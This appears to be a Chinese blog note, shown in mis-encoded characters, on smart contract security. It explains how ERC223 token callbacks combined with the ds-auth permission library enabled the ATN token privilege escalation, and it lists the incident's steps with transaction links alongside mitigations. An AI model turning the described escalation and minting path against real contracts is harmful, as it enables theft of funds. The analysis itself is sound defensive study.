<h3 id="ğŸ”¹-ERC223-çš„æ”¹è¿›"><a href="#ğŸ”¹-ERC223-çš„æ”¹è¿›" class="headerlink" title="ğŸ”¹ ERC223 çš„æ”¹è¿›"></a>ğŸ”¹ ERC223 çš„æ”¹è¿›</h3><p>ERC223 åœ¨ <code>transfer</code> æ—¶ä¼šæ£€æŸ¥æ¥æ”¶æ–¹æ˜¯å¦æ˜¯åˆçº¦ï¼š</p>
<ul>
<li>âœ¨ å¦‚æœæ¥æ”¶æ–¹æ˜¯ <strong>åˆçº¦åœ°å€</strong>ï¼Œåˆ™è‡ªåŠ¨è°ƒç”¨å…¶ <code>tokenFallback(address from, uint amount, bytes data)</code> å›è°ƒå‡½æ•°ã€‚</li>
<li>âœ¨ å¦‚æœæ˜¯æ™®é€šå¤–éƒ¨è´¦æˆ·ï¼Œå°±è·Ÿ ERC20 ä¸€æ ·ç›´æ¥è½¬è´¦ã€‚</li>
</ul>
<p>è¿™æ ·å¯ä»¥ <strong>ä¸€æ¬¡è°ƒç”¨å®Œæˆâ€œè½¬è´¦ + é€šçŸ¥åˆçº¦â€æ“ä½œ</strong>ï¼Œä¸éœ€è¦ <code>approve + transferFrom</code>ã€‚</p>
<table>
<thead>
<tr>
<th>åŠŸèƒ½</th>
<th>ERC20</th>
<th>ERC223</th>
</tr>
</thead>
<tbody><tr>
<td>å‘å¤–éƒ¨åœ°å€è½¬è´¦</td>
<td>âœ… ä¸€æ¬¡å³å¯</td>
<td>âœ… ä¸€æ¬¡å³å¯</td>
</tr>
<tr>
<td>å‘åˆçº¦åœ°å€è½¬è´¦</td>
<td>âŒ éœ€è¦ <code>approve + transferFrom</code>ï¼ˆä¸¤æ¬¡è°ƒç”¨ï¼‰</td>
<td>âœ… ä¸€æ¬¡ <code>transfer</code> è‡ªåŠ¨è°ƒç”¨å›è°ƒ</td>
</tr>
<tr>
<td>é˜²æ­¢ä»£å¸è¯¯è½¬åˆ°é»‘æ´åˆçº¦</td>
<td>âŒ ä¸ä¼šè­¦å‘Šï¼Œä»£å¸ç›´æ¥å¡æ­»</td>
<td>âœ… åˆçº¦å¿…é¡»å®ç° <code>tokenFallback</code> æ‰èƒ½æ¥æ”¶</td>
</tr>
</tbody></table>
<h2 id="DS-Authåº“"><a href="#DS-Authåº“" class="headerlink" title="DS-Authåº“"></a>DS-Authåº“</h2><p>å¥½çš„ï¼Œä¸‹é¢æŠŠå…³é”®ç‚¹è¯´æ¸…æ¥šâ€”â€”å…ˆå®šä¹‰æœ¯è¯­å’Œåº“çš„å…¸å‹ç”¨æ³•ï¼Œå†è¯´æ˜ <strong>ä¸ºä»€ä¹ˆæŠŠ ERC223 çš„å›è°ƒæœºåˆ¶ï¼ˆ<code>tokenFallback</code>&#x2F;<code>receive</code>ï¼‰å’Œ <code>ds-auth</code>ï¼ˆDappSys çš„æƒé™&#x2F;æˆæƒåº“ï¼‰ä¸€èµ·ç”¨æ—¶ï¼Œä¼šäº§ç”Ÿè¢«æ»¥ç”¨çš„æ”»å‡»é¢ï¼ˆåƒä½ çœ‹åˆ°çš„ ATN äº‹ä»¶é‚£æ ·ï¼‰</strong>ã€‚æˆ‘ä¼šç»™å‡ºä¸€ä¸ªå¯ç†è§£çš„æ”»å‡»è·¯å¾„ç¤ºä¾‹å¹¶åˆ—å‡ºå…·ä½“çš„é˜²å¾¡æªæ–½ã€‚</p>
<hr>
<h4 id="1-DS-Auth-æ˜¯ä»€ä¹ˆ"><a href="#1-DS-Auth-æ˜¯ä»€ä¹ˆ" class="headerlink" title="1) DS-Auth æ˜¯ä»€ä¹ˆ"></a>1) DS-Auth æ˜¯ä»€ä¹ˆ</h4><p><code>ds-auth</code> æ˜¯ DappSys &#x2F; DappHub ç”Ÿæ€ä¸­å¸¸è§çš„æˆæƒï¼ˆauthorityï¼‰æ¨¡å—ï¼Œç”¨æ¥å®ç°å¯æ‰©å±•çš„è®¿é—®æ§åˆ¶ã€‚å…¸å‹æ¥å£ç±»ä¼¼ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract DSAuthority &#123;</span><br><span class="line">    function canCall(address src, address dst, bytes4 sig) public view returns (bool);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ä½¿ç”¨ <code>ds-auth</code> çš„åˆçº¦é‡Œï¼Œå—ä¿æŠ¤å‡½æ•°ä¼šåœ¨å…¥å£å¤„è¯¢é—® authorityï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// pseudo</span><br><span class="line">require(authority == address(0) ? msg.sender == owner : DSAuthority(authority).canCall(msg.sender, address(this), msg.sig));</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼šæƒé™åˆ¤æ–­é€šå¸¸åŸºäºä¸‰è¦ç´  â€” <strong>è°ƒç”¨è€…åœ°å€ï¼ˆ<code>msg.sender</code>ï¼‰</strong>ã€<strong>ç›®æ ‡åˆçº¦åœ°å€ï¼ˆ<code>address(this</code>)ï¼‰</strong>ã€å’Œ <strong>å‡½æ•°é€‰æ‹©å­ï¼ˆ<code>msg.sig</code>ï¼‰</strong>ã€‚</p>
<hr>
<h4 id="2-msg-sig-æ˜¯ä»€ä¹ˆ"><a href="#2-msg-sig-æ˜¯ä»€ä¹ˆ" class="headerlink" title="2) msg.sig æ˜¯ä»€ä¹ˆ"></a>2) <code>msg.sig</code> æ˜¯ä»€ä¹ˆ</h4><p><code>msg.sig</code> æ˜¯ calldata çš„å‰ 4 å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ ABI çš„ <strong>å‡½æ•°é€‰æ‹©å­ï¼ˆfunction selectorï¼‰</strong>ã€‚<br> å®ƒç­‰åŒäº <code>bytes4(msg.data[:4])</code> æˆ– <code>bytes4(keccak256(&quot;functionName(type1,type2,...)&quot;))</code>ã€‚</p>
<ul>
<li><code>msg.sig</code> æ ‡è¯†è¢«è°ƒç”¨çš„æ˜¯å“ªä¸€ä¸ªå‡½æ•°ï¼ˆç­¾åï¼‰ï¼Œç”¨æ¥åœ¨æˆæƒåˆ¤æ–­ä¸­è¯†åˆ« â€œå“ªä¸ªå‡½æ•°è¢«è¯·æ±‚æ‰§è¡Œâ€ã€‚</li>
<li><code>msg.sig</code> <strong>ä¸åŒ…å«</strong>è°ƒç”¨è€…ä¿¡æ¯ï¼Œå®ƒåªæ˜¯æ–¹æ³•æ ‡è¯†ç¬¦ã€‚</li>
</ul>
<hr>
<h3 id="ERC223-çš„å›è°ƒæœºåˆ¶ä¸ºä½•å¸¦æ¥é£é™©"><a href="#ERC223-çš„å›è°ƒæœºåˆ¶ä¸ºä½•å¸¦æ¥é£é™©" class="headerlink" title="ERC223 çš„å›è°ƒæœºåˆ¶ä¸ºä½•å¸¦æ¥é£é™©"></a>ERC223 çš„å›è°ƒæœºåˆ¶ä¸ºä½•å¸¦æ¥é£é™©</h3><p>ERC223 åœ¨ <code>transfer(to, value, data)</code> æ—¶ï¼š</p>
<ul>
<li>å¦‚æœ <code>to</code> æ˜¯åˆçº¦ï¼Œä¼š <strong>è‡ªåŠ¨è§¦å‘</strong>æ¥æ”¶åˆçº¦çš„å›è°ƒï¼ˆä¾‹å¦‚å¸¸è§çš„ <code>tokenFallback(address from, uint value, bytes data)</code>ï¼‰ï¼Œä»è€Œè®©æ¥æ”¶åˆçº¦èƒ½åœ¨æ”¶åˆ°ä»£å¸æ—¶æ‰§è¡Œé€»è¾‘ã€‚</li>
<li>è¿™å°±äº§ç”Ÿäº†â€œ<strong>è½¬è´¦å³å›è°ƒ</strong>â€çš„è¡Œä¸ºé“¾ï¼šä»£å¸åˆçº¦ â†’ æ¥æ”¶åˆçº¦ çš„æ‰§è¡Œé¡ºåºä¸­ï¼Œä¼šæœ‰å¤–éƒ¨è°ƒç”¨ä¸å›è°ƒå‘ç”Ÿï¼ˆå¯èƒ½å¸¦æ¥é‡å…¥&#x2F;æƒé™åˆ©ç”¨æœºä¼šï¼‰ã€‚</li>
</ul>
<hr>
<h3 id="æ”»å‡»åŸç†æ¦‚è¿°"><a href="#æ”»å‡»åŸç†æ¦‚è¿°" class="headerlink" title="æ”»å‡»åŸç†æ¦‚è¿°"></a>æ”»å‡»åŸç†æ¦‚è¿°</h3><p>å…³é”®ç‚¹ï¼š<code>ds-auth</code> ç”¨ <code>msg.sender</code> + <code>msg.sig</code> åˆ¤æ–­æƒé™ï¼Œè€Œ <strong>ERC223 çš„å›è°ƒä¼šä½¿ <code>msg.sender</code> å˜æˆâ€œå‘èµ·å›è°ƒçš„åˆçº¦åœ°å€ï¼ˆtoken åˆçº¦ï¼‰æˆ–æ¶æ„åˆçº¦åœ°å€â€</strong>ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ç»„åˆå‡ºå¯è¡Œæ”»å‡»é“¾ï¼Œå¸¸è§å¥—è·¯å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>æƒé™é…ç½®å¤±è¯¯ &#x2F; è¿‡å®½çš„æˆæƒ</strong><ul>
<li>å¦‚æœ <code>authority</code> è¢«è®¾ç½®ä¸ºå…è®¸æŸä¸ªåˆçº¦ï¼ˆæˆ–ä¸€ç±»åˆçº¦ï¼‰å¯¹ä»»æ„ï¼ˆæˆ–è‹¥å¹²ï¼‰æ•æ„Ÿå‡½æ•°è°ƒç”¨ <code>canCall</code> è¿”å› <code>true</code>ï¼Œé‚£ä¹ˆå½“è¯¥åˆçº¦ï¼ˆæˆ–æ¶æ„å®ç°ï¼‰åœ¨å›è°ƒæœŸé—´å‘èµ·å¯¹ç›®æ ‡åˆçº¦çš„è°ƒç”¨æ—¶ï¼Œå°±ä¼šè¢« <code>ds-auth</code> è§†ä¸ºåˆæ³•è°ƒç”¨ã€‚</li>
</ul>
</li>
<li><strong>ERC223 å›è°ƒä½œä¸ºè½½ä½“è§¦å‘æ•æ„Ÿå‡½æ•°</strong><ul>
<li>æ”»å‡»è€…éƒ¨ç½²ä¸€ä¸ªæ¶æ„ token åˆçº¦æˆ–æ“çºµè½¬è´¦æµç¨‹ï¼Œä½¿ç›®æ ‡åˆçº¦åœ¨ token è½¬è´¦çš„è¿‡ç¨‹ä¸­è¢«å›è°ƒã€‚å›è°ƒçš„ä¸Šä¸‹æ–‡ <code>msg.sender</code> æŒ‡å‘ token åˆçº¦ï¼ˆæˆ–æ¶æ„ä¸­é—´åˆçº¦ï¼‰ï¼Œè€Œ <code>msg.sig</code> ä»ç„¶è¡¨æ˜ç›®æ ‡å‡½æ•°ï¼ˆæ¯”å¦‚ <code>setOwner(...)</code>ã€<code>mint(...)</code>ï¼‰çš„ selectorã€‚</li>
<li>å¦‚æœ authority çš„ç­–ç•¥å…è®¸è¯¥ <code>msg.sender</code> å¯¹è¯¥ <code>msg.sig</code> è¿›è¡Œè°ƒç”¨ï¼ˆæˆ–è€…æˆæƒé€»è¾‘æœ‰ç¼ºé™·ï¼‰ï¼Œæ”»å‡»è€…å°±èƒ½åœ¨å›è°ƒä¸­è°ƒç”¨æ•æ„Ÿæ¥å£ï¼Œä»è€Œææƒæˆ–é“¸å¸ã€‚</li>
</ul>
</li>
<li><strong>æ©ç›–æ¥æº &#x2F; æ¶æ„æ¢å¤</strong><ul>
<li>æ”»å‡»è€…å¯èƒ½åœ¨æ‹¿åˆ°æƒé™åæŠŠ <code>owner</code> æ¢å¤ä¸ºåŸåœ°å€ï¼Œç•™ä¸‹æœ€å°å¯è¿½è¸ªç—•è¿¹ï¼Œè€Œä¸­é—´å·²ç»é“¸å¸&#x2F;è½¬èµ°èµ„äº§ã€‚</li>
</ul>
</li>
</ol>
<blockquote>
<p>æ¢å¥è¯è¯´ï¼š<strong>ERC223 æä¾›äº†â€œåœ¨ä»£å¸è½¬è´¦æœŸé—´æ‰§è¡Œåˆçº¦ä»£ç â€çš„å…¥å£ï¼Œè€Œ ds-auth çš„æˆæƒå†³ç­–æ°å¥½åŸºäºâ€œè°å‘èµ·è°ƒç”¨ï¼ˆmsg.senderï¼‰ä¸è¦è°ƒç”¨å“ªä¸ªå‡½æ•°ï¼ˆmsg.sigï¼‰â€</strong>ã€‚å½“æˆæƒç­–ç•¥é…ç½®ä¸ä¸¥ï¼ˆæˆ–å­˜åœ¨é€»è¾‘æ¼æ´ï¼‰æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ å›è°ƒè°ƒç”¨æŠŠè‡ªå·±â€œä¼ªè£…â€ä¸ºè¢«æˆæƒçš„è°ƒç”¨è€…ï¼Œæˆ–åˆ©ç”¨è¢«æˆæƒçš„åˆçº¦ä½œä¸ºè·³æ¿ï¼Œå»è°ƒç”¨æœ¬ä¸è¯¥è‡ªå·±è°ƒç”¨çš„ç®¡ç†å‡½æ•°ã€‚</p>
</blockquote>
<hr>
<h4 id="ä¸€ä¸ªç®€å•ï¼ˆæŠ½è±¡ï¼‰ç¤ºä¾‹æµç¨‹"><a href="#ä¸€ä¸ªç®€å•ï¼ˆæŠ½è±¡ï¼‰ç¤ºä¾‹æµç¨‹" class="headerlink" title="ä¸€ä¸ªç®€å•ï¼ˆæŠ½è±¡ï¼‰ç¤ºä¾‹æµç¨‹"></a>ä¸€ä¸ªç®€å•ï¼ˆæŠ½è±¡ï¼‰ç¤ºä¾‹æµç¨‹</h4><ul>
<li>ç›®æ ‡åˆçº¦ <code>Target</code> ä½¿ç”¨ <code>ds-auth</code> åˆ¤æ–­ï¼š<code>DSAuthority.canCall(msg.sender, address(this), msg.sig)</code>ã€‚</li>
<li><code>authority</code> é”™è¯¯åœ°å…è®¸ <code>SomeTokenContract</code> å¯¹æŸäº› selectorï¼ˆæ¯”å¦‚ <code>mint</code>ï¼‰è¿”å› <code>true</code>ï¼ˆä¾‹å¦‚å› ä¸ºæŸæ¬¡é…ç½®å¤±è¯¯æˆ–æŠŠâ€œä»£å¸åˆçº¦â€åˆ—å…¥ç™½åå•ï¼‰ã€‚</li>
<li>æ”»å‡»è€…éƒ¨ç½²&#x2F;æ§åˆ¶ <code>SomeTokenContract</code>ï¼Œå¹¶åœ¨å…¶ <code>transfer</code> å†…è§¦å‘ <code>tokenFallback</code>ï¼Œåœ¨å›è°ƒä¸­ <strong>ä»£è¡¨ token åˆçº¦</strong> å»è°ƒç”¨ <code>Target.mint(attacker, amount)</code>ã€‚</li>
<li><code>Target</code> åœ¨æƒé™æ£€æŸ¥çœ‹åˆ° <code>msg.sender == SomeTokenContract</code>ï¼Œ<code>msg.sig == mint selector</code>ï¼Œè€Œ authority å…è®¸è¿™ç§è°ƒç”¨ â†’ å› æ­¤æ‰§è¡Œ <code>mint</code>ï¼ŒæŠŠä»£å¸é“¸ç»™æ”»å‡»è€…ã€‚</li>
</ul>
<hr>
<h4 id="ä¸ºä»€ä¹ˆè¿™ç±»æ”»å‡»å®¹æ˜“è¢«å¿½è§†-æˆåŠŸç‡é«˜"><a href="#ä¸ºä»€ä¹ˆè¿™ç±»æ”»å‡»å®¹æ˜“è¢«å¿½è§†-æˆåŠŸç‡é«˜" class="headerlink" title="ä¸ºä»€ä¹ˆè¿™ç±»æ”»å‡»å®¹æ˜“è¢«å¿½è§† &#x2F; æˆåŠŸç‡é«˜"></a>ä¸ºä»€ä¹ˆè¿™ç±»æ”»å‡»å®¹æ˜“è¢«å¿½è§† &#x2F; æˆåŠŸç‡é«˜</h4><ul>
<li><code>ds-auth</code> çš„æˆæƒé€»è¾‘çœ‹èµ·æ¥â€œé€šç”¨â€ï¼šæŒ‰ <code>src/dst/sig</code> ä¸‰å…ƒç»„æˆæƒéå¸¸çµæ´»ï¼Œä½†ä¹Ÿå› æ­¤è‹¥ç®¡ç†ä¸æ…ï¼ˆä¾‹å¦‚æŠŠæŸä¸ªåˆçº¦åˆ—ä¸ºå¯ä¿¡ã€æˆ–æ‰¹é‡æˆæƒæŸäº› selectorï¼‰ï¼Œä¼šäº§ç”Ÿéå¸¸å±é™©çš„åæœã€‚</li>
<li>ERC223 çš„å›è°ƒçœ‹ä¼¼æ–¹ä¾¿ï¼ˆä¸€æ¬¡è½¬è´¦å¹¶é€šçŸ¥æ¥æ”¶æ–¹ï¼‰ï¼Œä½†å®ƒæŠŠâ€œé€šçŸ¥â€å˜æˆäº†â€œå¯ä»¥æ‰§è¡Œä»»æ„é€»è¾‘çš„å…¥å£â€ï¼Œç»™æ”»å‡»è€…æä¾›äº†æ—¶é—´çª—å£ä¸ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼ˆ<code>msg.sender</code> ä¼šå˜ï¼‰ã€‚</li>
</ul>
<hr>
<h4 id="é˜²å¾¡ä¸å®è·µå»ºè®®"><a href="#é˜²å¾¡ä¸å®è·µå»ºè®®" class="headerlink" title="é˜²å¾¡ä¸å®è·µå»ºè®®"></a>é˜²å¾¡ä¸å®è·µå»ºè®®</h4><ol>
<li><strong>ä¸è¦æŠŠä»£å¸åˆçº¦æˆ–ä»»æ„ç¬¬ä¸‰æ–¹åˆçº¦ä½œä¸ºå¹¿æ³›æˆæƒå¯¹è±¡</strong><ul>
<li><code>authority</code> çš„ç™½åå•åº”å°½é‡ç²¾ç¡®åˆ°å…·ä½“åˆçº¦åœ°å€ + å…·ä½“ selectorï¼›ä¸è¦æŠŠâ€œä»£å¸åˆçº¦â€æˆ–â€œä»»ä½•åˆçº¦â€å¹¿æ³›æˆæƒã€‚</li>
</ul>
</li>
<li><strong>æ•æ„Ÿå‡½æ•°ä¼˜å…ˆä½¿ç”¨ä¸¥æ ¼çš„ <code>msg.sender == owner</code> æˆ–å¤šç­¾æ§åˆ¶</strong><ul>
<li>å¯¹æå…¶æ•æ„Ÿçš„ç®¡ç†æ“ä½œï¼ˆå¦‚ <code>setOwner</code>ã€<code>mint</code>ã€<code>upgrade</code>ï¼‰ï¼Œå°½é‡ä¸ä¾èµ–å¯æ‰©å±•çš„ä¸‰å…ƒç»„æˆæƒä½œä¸ºå”¯ä¸€é—¨æ§›ï¼Œé‡‡ç”¨ <code>owner-only</code> æˆ–å¤šç­¾&#x2F;æ²»ç†åˆçº¦ã€‚</li>
</ul>
</li>
<li><strong>å¯¹æ¥æ”¶ token çš„å›è°ƒä¿æŒæœ€å°æƒé™ä¸æœ€å°è¡Œä¸º</strong><ul>
<li>åœ¨ <code>tokenFallback</code> &#x2F; <code>receive</code> ä¸­å°½é‡åªåšæœ€å°‘çš„çŠ¶æ€è®°å½•&#x2F;äº‹ä»¶ï¼Œè€Œä¸è¦åœ¨å›è°ƒä¸­ç›´æ¥è§¦å‘é«˜æƒé™ä¿®æ”¹æˆ–ç®¡ç†æ“ä½œã€‚</li>
</ul>
</li>
<li><strong>å®¡æ…é…ç½® authorityï¼Œå¹¶å¯¹æˆæƒå˜æ›´ä¿ç•™å®¡è®¡æ—¥å¿—</strong><ul>
<li>å¯¹ <code>authority</code> çš„ä»»ä½•ä¿®æ”¹éƒ½è¦é€šè¿‡æ²»ç†æµç¨‹æˆ–å¤šç­¾ï¼Œå¹¶è®°å½•å˜æ›´ï¼Œä¾¿äºäº‹åè¿½æŸ¥ã€‚</li>
</ul>
</li>
<li><strong>é¿å…æŠŠæˆæƒå†³ç­–ä»…ä»…ä¾èµ– <code>msg.sig</code> çš„â€œç™½åå•â€</strong><ul>
<li>å¯ä»¥åœ¨ <code>canCall</code> å†…åŠ å…¥é¢å¤–ä¸Šä¸‹æ–‡æ£€æŸ¥ï¼ˆä¾‹å¦‚ï¼šåªå…è®¸ç‰¹å®š <code>src</code> åœ¨ç‰¹å®šæƒ…å†µä¸‹å¯¹ç‰¹å®š <code>dst</code>&#x2F;<code>sig</code> è°ƒç”¨ï¼‰ï¼Œå¹¶å¯¹â€œåˆçº¦è°ƒç”¨â€ä¸â€œEOA è°ƒç”¨â€åšä¸åŒç­–ç•¥ã€‚</li>
</ul>
</li>
<li><strong>ä¸ ERC223 é›†æˆæ—¶è¦å°å¿ƒï¼šå°†æ¥æ”¶å›è°ƒåªä½œä¸ºé€šçŸ¥ï¼Œä¸ä½œä¸ºè§¦å‘ç®¡ç†å…¥å£</strong><ul>
<li>å¦‚æœå¿…é¡»åœ¨å›è°ƒä¸­æ‰§è¡ŒåŠ¨ä½œï¼Œå…ˆæŠŠå¿…è¦çŠ¶æ€â€œé”å®šâ€æˆ–é€šè¿‡éå›è°ƒçš„åç»­æµç¨‹å®Œæˆï¼ˆé¿å…åœ¨å›è°ƒé‡Œå®Œæˆå…³é”®æˆæƒå˜æ›´ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>å†™æ”»å‡»&#x2F;å›å½’æµ‹è¯•å¹¶ç”¨é™æ€åˆ†æå·¥å…·æ‰«æ</strong><ul>
<li>ç”¨æ¶æ„ token å›è°ƒåˆçº¦æ¨¡æ‹Ÿæ”»å‡»è·¯å¾„ï¼›ç”¨ Slither ç­‰å·¥å…·æ‰«æ <code>canCall</code> çš„æ½œåœ¨é…ç½®é—®é¢˜ä¸å±é™©æ¨¡å¼ã€‚</li>
</ul>
</li>
<li><strong>ä½¿ç”¨äº’æ–¥ä¸ CEI é˜²æ­¢å›è°ƒæœŸé—´çŠ¶æ€æœªä¸€è‡´</strong><ul>
<li>å¯¹æ˜“å—é‡å…¥çš„å‡½æ•°åŠ  <code>nonReentrant</code> æˆ–é‡‡ç”¨ CEIï¼ˆå…ˆæ›´æ–°çŠ¶æ€å†äº¤äº’ï¼‰ã€‚</li>
</ul>
</li>
</ol>
<hr>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p><code>ds-auth</code> æœ¬èº«æ˜¯çµæ´»çš„æˆæƒæ¡†æ¶ï¼Œä½†å®ƒåŸºäº <code>msg.sender</code>&#x2F;<code>msg.sig</code> çš„åˆ¤æ–­åœ¨ <strong>é‡åˆ° ERC223 çš„å›è°ƒèƒ½åŠ›</strong>ï¼ˆæˆ–å…¶å®ƒå¯æ‰§è¡Œå›è°ƒçš„ token æ ‡å‡†&#x2F;åˆçº¦ï¼‰æ—¶ï¼Œä¼šæ”¾å¤§ä»»ä½•æˆæƒé…ç½®é”™è¯¯æˆ–è®¾è®¡ç¼ºé™·çš„é£é™©â€”â€”æ”»å‡»è€…å¯ä»¥ç”¨â€œåœ¨å›è°ƒä¸­å‘èµ·è°ƒç”¨â€çš„æŠ€æœ¯æŠŠè‡ªå·±ä¼ªè£…ä¸ºè¢«æˆæƒçš„è°ƒç”¨è€…ï¼Œä»è€Œæ‰§è¡Œæ•æ„Ÿæ“ä½œï¼ˆå¦‚æ“…è‡ªé“¸å¸ã€æ”¹ ownerï¼‰ï¼Œè¿™æ­£æ˜¯ ATN ç±»æ”»å‡»èƒŒåçš„æ ¸å¿ƒæœºåˆ¶ã€‚</p>
<h2 id="ATN-æ”»å‡»æµç¨‹"><a href="#ATN-æ”»å‡»æµç¨‹" class="headerlink" title="ATN æ”»å‡»æµç¨‹"></a>ATN æ”»å‡»æµç¨‹</h2><p><strong>1. åˆ©ç”¨ ERC223 æ–¹æ³•æ¼æ´ææƒï¼ˆå°†è‡ªå·±è®¾ä¸º ownerï¼‰</strong></p>
<p><strong>åŠ¨ä½œ</strong>ï¼šæ”»å‡»è€…åˆ©ç”¨åˆçº¦ä¸­ ERC223 ç›¸å…³å®ç°çš„æ¼æ´ï¼Œæ‰§è¡Œææƒæ“ä½œï¼ŒæŠŠè‡ªå·±çš„åœ°å€è®¾ä¸ºäº†åˆçº¦ <code>owner</code>ã€‚<br> <strong>ç›®çš„</strong>ï¼šè·å–ç®¡ç†æƒé™ä»¥ä¾¿åç»­é“¸é€ æˆ–è½¬ç§»ä»£å¸ã€‚<br> <strong>é“¾ä¸Šäº¤æ˜“</strong>ï¼š<br> <a target="_blank" rel="noopener" href="https://etherscan.io/tx/0x3b7bd618c49e693c92b2d6bfb3a5adeae498d9d170c15fcc79dd374166d28b7b">https://etherscan.io/tx/0x3b7bd618c49e693c92b2d6bfb3a5adeae498d9d170c15fcc79dd374166d28b7b</a></p>
<hr>
<p><strong>2. å‘è¡Œ&#x2F;é“¸é€ å¤§é‡ ATN åˆ°æ”»å‡»ä¸»åœ°å€</strong></p>
<p><strong>åŠ¨ä½œ</strong>ï¼šæ‹¿åˆ° <code>owner</code> æƒé™åï¼Œæ”»å‡»è€…è°ƒç”¨é“¸é€ &#x2F;å‘è¡Œï¼ˆmintï¼‰æˆ–ç±»ä¼¼çš„ç®¡ç†å‡½æ•°ï¼ŒæŠŠå¤§é‡ ATN å‘è¡Œåˆ°è‡ªå·±çš„ä¸»æ§åœ°å€ã€‚<br> <strong>æè¿°</strong>ï¼šä½ è®°å½•ä¸º â€œå‘è¡Œ 1100W ATNâ€ã€‚ï¼ˆæ³¨ï¼š<code>1100W</code> å¸¸è¢«ç”¨æ¥è¡¨ç¤º <code>1100 ä¸‡</code>ï¼Œå³ <strong>11,000,000 ATN</strong>ï¼›è‹¥è¡¨è¿°æœ‰åˆ«ï¼Œè¯·æŒ‰é“¾ä¸Šæ•°é‡ä¸ºå‡†ã€‚ï¼‰<br> <strong>é“¾ä¸Šäº¤æ˜“</strong>ï¼š<br> <a target="_blank" rel="noopener" href="https://etherscan.io/tx/0x9b559ffae76d4b75d2f21bd643d44d1b96ee013c79918511e3127664f8f7a910">https://etherscan.io/tx/0x9b559ffae76d4b75d2f21bd643d44d1b96ee013c79918511e3127664f8f7a910</a></p>
<hr>
<p><strong>3. æ¢å¤ owner ä¸ºåŸæ¥åœ°å€ï¼ˆä¼å›¾æ©ç›–ç—•è¿¹ï¼‰</strong></p>
<p><strong>åŠ¨ä½œ</strong>ï¼šæ”»å‡»è€…å°† <code>owner</code> è®¾ç½®å›åŸå…ˆåœ°å€æˆ–å…¶ä»–åœ°å€ï¼Œä»¥æ©ç›–åˆšæ‰çš„ææƒç—•è¿¹ï¼Œè¯•å›¾å‡å°‘å¯è¿½æº¯æ€§&#x2F;è¯±å¯¼å®¡è®¡è¯¯åˆ¤ã€‚<br> <strong>é“¾ä¸Šäº¤æ˜“</strong>ï¼š<br> <a target="_blank" rel="noopener" href="https://etherscan.io/tx/0xfd5c2180f002539cd636132f1baae0e318d8f1162fb62fb5e3493788a034545a">https://etherscan.io/tx/0xfd5c2180f002539cd636132f1baae0e318d8f1162fb62fb5e3493788a034545a</a></p>
<hr>
<p><strong>4. å°†å·å¾—çš„ä»£å¸åˆ†æ•£åˆ°å¤šä¸ªåœ°å€ï¼ˆæ´—åˆ†&#x2F;åˆ†æ•£é£é™©ï¼‰</strong></p>
<p><strong>åŠ¨ä½œ</strong>ï¼šæ”»å‡»è€…æŠŠè·å¾—çš„å¤§é¢ ATN åˆ†æ‰¹è½¬åˆ° <strong>14 ä¸ªåœ°å€</strong>ï¼Œä»¥åˆ†æ•£å’Œè½¬ç§»èµ„äº§ï¼Œå¢åŠ è¿½è¸ªéš¾åº¦å¹¶ä¸ºåç»­æ¢å¸&#x2F;å‡ºé‡‘åšå‡†å¤‡ã€‚<br> <strong>ç›®çš„</strong>ï¼šè§„é¿ç›‘æµ‹ã€é™ä½å•ä¸€åœ°å€é£æ§è§¦å‘æ¦‚ç‡ã€å‡†å¤‡è·¨äº¤æ˜“æ‰€æˆ–é€šè¿‡å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆDEXï¼‰å¥—ç°ã€‚<br> <strong>ï¼ˆè‹¥éœ€ï¼‰é“¾ä¸Šäº¤æ˜“ç¤ºä¾‹</strong>ï¼šå¯åœ¨æ”»å‡»ä¸»åœ°å€çš„ token è½¬è´¦è®°å½•ä¸­æŸ¥çœ‹ç›¸åº”å¤šç¬” <code>transfer</code>ã€‚</p>
<h1 id="ç®—æœ¯æº¢å‡º-under-flows"><a href="#ç®—æœ¯æº¢å‡º-under-flows" class="headerlink" title="ç®—æœ¯æº¢å‡º(under flows)"></a>ç®—æœ¯æº¢å‡º(under flows)</h1><ul>
<li><p><strong>ç®—æ•°æº¢å‡º&#x2F;ä¸‹æº¢</strong>ï¼šå½“ä¸€ä¸ªæ•´æ•°åŠ æ³•&#x2F;å‡æ³•è¶…å‡ºå…¶èƒ½è¡¨ç¤ºçš„èŒƒå›´æ—¶ï¼ˆä¾‹å¦‚ <code>uint8</code> è¶…è¿‡ 255ï¼‰ï¼Œæ—§ç‰ˆ Solidity ä¼š<code>wrap around</code>ï¼ˆæ¨¡ 2^nï¼‰ï¼Œå¯¼è‡´å€¼å˜æˆçœ‹ä¼¼â€œä»»æ„â€çš„å°&#x2F;å¤§æ•°ï¼›æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ”¹å†™ä½™é¢&#x2F;è®¡æ•°ï¼Œä»è€Œç»•è¿‡æ£€æŸ¥æˆ–çªƒå–èµ„äº§ã€‚</p>
</li>
<li><p><strong>ç°ä»£ Solidityï¼ˆ^0.8.0 åŠä»¥ä¸Šï¼‰é»˜è®¤æ£€æµ‹æº¢å‡ºå¹¶ revert</strong>ï¼Œæ‰€ä»¥çœŸæ­£çš„æº¢å‡ºæ”»å‡»å¤šè§äºä½¿ç”¨æ—§ç‰ˆæœ¬æˆ–æ˜¾å¼ <code>unchecked</code> çš„ä»£ç ï¼Œæˆ–åº“é”™è¯¯åœ°ç¦ç”¨äº†æ£€æŸ¥ã€‚</p>
</li>
</ul>
